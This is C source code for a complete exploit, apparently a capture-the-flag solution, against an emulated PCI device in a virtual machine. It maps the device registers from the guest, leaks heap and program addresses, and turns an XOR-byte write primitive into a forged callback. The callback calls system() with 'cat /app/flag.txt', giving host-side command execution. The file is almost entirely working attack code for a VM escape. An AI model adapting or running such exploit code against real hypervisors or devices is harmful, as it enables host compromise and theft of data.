#define _GNU_SOURCE
#include <fcntl.h>
#include <inttypes.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <unistd.h>

#define BAR_PHYS 0xfebfe000ULL
#define CONTROL 0x0c
#define Q_BASE_LO 0x10
#define Q_BASE_HI 0x14
#define Q_SIZE 0x18
#define Q_HEAD 0x1c
#define Q_TAIL 0x20
#define P_COMMAND 0x24
#define P_CONTEXT_LEN 0x28
#define P_SELECT 0x2c
#define P_MODE 0x30
#define P_FLAGS 0x34
#define P_LIMIT 0x38
#define P_KEY_LO 0x3c
#define P_KEY_HI 0x40
#define QUEUE_NOTIFY 0x4c
#define CMD_ENABLE 1
#define CMD_CLEAR 3
#define CMD_REBUILD 4
#define OP_STATS 3
#define OP_CONTEXT 5

typedef struct __attribute__((packed)) {
    uint64_t req_addr; uint32_t req_len, flags;
    uint64_t resp_addr; uint32_t resp_len, tag;
    uint64_t stream_addr; uint32_t stream_len; uint8_t reserved[16];
} Desc;
typedef struct __attribute__((packed)) {
    uint32_t opcode, profile_id, flags, max_output;
    uint64_t aux_addr; uint32_t aux_len; uint8_t reserved[16];
} Req;
typedef struct __attribute__((packed)) {
    uint32_t tag,status,score,verdict,generation,out_len; uint8_t out[];
} Resp;

static volatile uint32_t *bar;
static uint8_t *mem;
static uint64_t mem_pa;

static void wr(unsigned off,uint32_t v){ bar[off/4]=v; __sync_synchronize(); }
static uint32_t rd(unsigned off){ uint32_t v=bar[off/4]; __sync_synchronize(); return v; }
static uint64_t virt_to_phys(void *p){
    uint64_t ent=0; int fd=open("/proc/self/pagemap",O_RDONLY);
    if(fd<0||pread(fd,&ent,8,((uintptr_t)p/4096)*8)!=8){perror("pagemap");exit(1);} close(fd);
    if(!(ent&(1ULL<<63))){fprintf(stderr,"page absent\n");exit(1);} return (ent&((1ULL<<55)-1))*4096+((uintptr_t)p&4095);
}
static void sel(int p){wr(P_SELECT,p);}
static void pwrite32(int p,unsigned reg,uint32_t v){sel(p);wr(reg,v);}
static void transport(Desc *d){
    uint64_t pa=mem_pa+(uint64_t)((uint8_t*)d-mem);
    wr(0x08,0);wr(CONTROL,0);wr(Q_BASE_LO,(uint32_t)pa);wr(Q_BASE_HI,(uint32_t)(pa>>32));wr(Q_SIZE,2);wr(Q_TAIL,0);wr(CONTROL,1);wr(Q_TAIL,1);wr(QUEUE_NOTIFY,1);
}
static Resp *normal_req(uint32_t op,uint32_t profile,uint32_t maxout){
    memset(mem,0,4096); Desc *d=(Desc*)mem; Req *q=(Req*)(mem+256); Resp *r=(Resp*)(mem+512);
    q->opcode=op;q->profile_id=profile;q->max_output=maxout;
    d->req_addr=mem_pa+256;d->req_len=sizeof(*q);d->resp_addr=mem_pa+512;d->resp_len=24+maxout;d->tag=0x41414141;
    transport(d); for(int i=0;i<10000&&rd(Q_HEAD)!=1;i++) usleep(100); return r;
}
static void setup_source(void){
    pwrite32(0,P_KEY_LO,0);pwrite32(0,P_KEY_HI,4);pwrite32(0,P_CONTEXT_LEN,64);pwrite32(0,P_COMMAND,CMD_REBUILD);
}
static void setup_overlap(uint32_t victim,uint64_t key,uint32_t mode,uint32_t target_profile){
    pwrite32(1,P_COMMAND,CMD_CLEAR);pwrite32(1,P_CONTEXT_LEN,176);pwrite32(1,P_KEY_LO,(uint32_t)key);pwrite32(1,P_KEY_HI,(uint32_t)(key>>32));pwrite32(1,P_MODE,mode);pwrite32(1,P_FLAGS,target_profile);
    sel(victim);
}
static void trigger(void){
    memset(mem,0,4096);Desc*d=(Desc*)mem;Req*q=(Req*)(mem+256);
    q->opcode=OP_CONTEXT;q->profile_id=0;q->max_output=64;
    d->req_addr=mem_pa+256;d->req_len=sizeof(*q);d->resp_addr=BAR_PHYS+8;d->resp_len=88;d->tag=0;
    transport(d);usleep(100000);
}
static uint64_t leak_profiles1(void){
    setup_source(); setup_overlap(1,0,0,2); trigger();
    Resp*r=normal_req(OP_STATS,2,32); if(r->status||r->out_len<32){printf("stats err %u len %u\n",r->status,r->out_len);exit(1);} 
    uint32_t lo,hi;memcpy(&lo,r->out+16,4);memcpy(&hi,r->out+20,4);return ((uint64_t)hi<<32)|lo;
}
static void xor_byte(uint64_t addr,uint8_t value){
    setup_source(); setup_overlap(1,addr-22,value,2); trigger();
}
static void write_null_ptr(uint64_t field,uint64_t value){
    for(int i=0;i<8;i++) xor_byte(field+i,(uint8_t)(value>>(8*i)));
}
static void change_ptr(uint64_t field,uint64_t oldv,uint64_t newv){
    for(int i=0;i<8;i++){uint8_t x=(uint8_t)((oldv^newv)>>(8*i));if(x)xor_byte(field+i,x);}
}
static void score_command(const char *cmd){
    memset(mem,0,4096);Desc*d=(Desc*)mem;Req*q=(Req*)(mem+256);Resp*r=(Resp*)(mem+512);char*s=(char*)mem+1024;strcpy(s,cmd);
    q->opcode=1;q->profile_id=0;q->max_output=64;
    d->req_addr=mem_pa+256;d->req_len=sizeof(*q);d->resp_addr=mem_pa+512;d->resp_len=88;d->tag=0x1337;d->stream_addr=mem_pa+1024;d->stream_len=strlen(s);
    transport(d);for(int i=0;i<10000&&rd(Q_HEAD)!=1;i++)usleep(100);printf("score returned st=%u\n",r->status);
}
int main(void){
    int cfd=open("/sys/bus/pci/devices/0000:00:02.0/config",O_RDWR); if(cfd>=0){uint16_t cmd=0;pread(cfd,&cmd,2,4);cmd|=6;pwrite(cfd,&cmd,2,4);close(cfd);}
    int fd=open("/sys/bus/pci/devices/0000:00:02.0/resource0",O_RDWR|O_SYNC);if(fd<0){perror("resource0");return 1;}bar=mmap(NULL,4096,PROT_READ|PROT_WRITE,MAP_SHARED,fd,0);if(bar==MAP_FAILED){perror("mmap bar");return 1;}
    mem=mmap(NULL,4096,PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS|MAP_POPULATE,-1,0);if(mem==MAP_FAILED){perror("mmap");return 1;}mlock(mem,4096);mem[0]=0;mem_pa=virt_to_phys(mem);
    printf("mem va=%p pa=%#"PRIx64" magic=%08x\n",mem,mem_pa,rd(0));
    Resp *t=normal_req(OP_STATS,0,32); printf("baseline head=%u dev=%x st=%u len=%u tag=%x\n",rd(Q_HEAD),rd(8),t->status,t->out_len,t->tag);
    uint64_t p1=leak_profiles1();printf("profiles[1]=%#"PRIx64" core=%#"PRIx64"\n",p1,p1-176-72);
    uint64_t core=p1-176-72, field=core+176+72*3+48;
    pwrite32(3,P_COMMAND,CMD_CLEAR);pwrite32(3,P_MODE,0);pwrite32(3,P_KEY_LO,0);pwrite32(3,P_KEY_HI,0);
    write_null_ptr(field,core-16);
    Resp *leak=normal_req(OP_CONTEXT,3,1024); printf("leak st=%u len=%u\n",leak->status,leak->out_len);
    uint8_t corecopy[1024];memcpy(corecopy,leak->out,1024);
    uint64_t worker=0;memcpy(&worker,leak->out+0xa0,8);
    printf("worker=%#"PRIx64"\n",worker);
    change_ptr(field,core-16,worker-16);
    Resp *bh=normal_req(OP_CONTEXT,3,80);uint64_t cb=0;memcpy(&cb,bh->out+16,8);uint64_t pie=cb-0x53d2a0;printf("cb=%#"PRIx64" pie=%#"PRIx64"\n",cb,pie);
    uint64_t realctx=0,realname=0;memcpy(&realctx,bh->out,8);memcpy(&realname,bh->out+8,8);
    uint64_t fake=worker-0x40,cmdp=core+0x310,systemplt=pie+0x338150;
    change_ptr(field,worker-16,fake-16);
    Resp *around=normal_req(OP_CONTEXT,3,64);printf("previous chunk len=%u\n",around->out_len);if(around->out_len<56)return 1;
    uint8_t adj[64];memcpy(adj,around->out,64);
    if(((worker^fake)&~0xffULL)!=0){puts("bad heap alignment");return 1;}
    uint8_t want[56]={0};memcpy(want,&realctx,8);memcpy(want+8,&realname,8);memcpy(want+16,&systemplt,8);memcpy(want+24,&cmdp,8);
    for(int i=0;i<56;i++){uint8_t x=adj[i]^want[i];if(x)xor_byte(fake+i,x);}
    const char cmd[]="cat /app/flag.txt";
    for(unsigned i=0;i<sizeof(cmd);i++){uint8_t x=corecopy[0x310+i]^(uint8_t)cmd[i];if(x)xor_byte(cmdp+i,x);}
    Resp *verify=normal_req(OP_CONTEXT,3,64);int bad=memcmp(verify->out,want,56);printf("fake verify len=%u bad=%d ctx=%#"PRIx64" name=%#"PRIx64" cb=%#"PRIx64" opaque=%#"PRIx64"\n",verify->out_len,bad,*(uint64_t*)(verify->out),*(uint64_t*)(verify->out+8),*(uint64_t*)(verify->out+16),*(uint64_t*)(verify->out+24));
    printf("fake=%#"PRIx64" system@plt=%#"PRIx64" cmd=%#"PRIx64"\n",fake,systemplt,cmdp);
    xor_byte(core+160,(uint8_t)(worker^fake));
    puts("triggering fake BH...");
    uint64_t dpa=mem_pa;uint32_t h=rd(Q_HEAD);wr(CONTROL,0);wr(Q_BASE_LO,(uint32_t)dpa);wr(Q_BASE_HI,(uint32_t)(dpa>>32));wr(Q_SIZE,2);wr(Q_TAIL,h^1);wr(CONTROL,1);wr(QUEUE_NOTIFY,1);usleep(1000000);printf("after kick head=%u status=%x control=%x\n",rd(Q_HEAD),rd(8),rd(CONTROL));
    return 0;
}

